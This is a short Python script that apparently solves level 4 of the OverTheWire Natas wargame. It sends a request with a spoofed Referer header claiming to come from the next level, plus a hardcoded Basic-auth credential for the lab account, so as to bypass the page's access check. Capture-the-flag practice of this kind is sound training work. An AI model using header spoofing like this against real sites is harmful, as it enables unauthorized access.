import requests

headers = {
    'referer': "http://natas5.natas.labs.overthewire.org/",
    'authorization': "Basic bmF0YXM0Olo5dGtSa1dtcHQ5UXI3WHJSNWpXUmtnT1U5MDFzd0Va"
    }

response = requests.request("GET", "http://natas4.natas.labs.overthewire.org/index.php", headers=headers)

print(response.text)
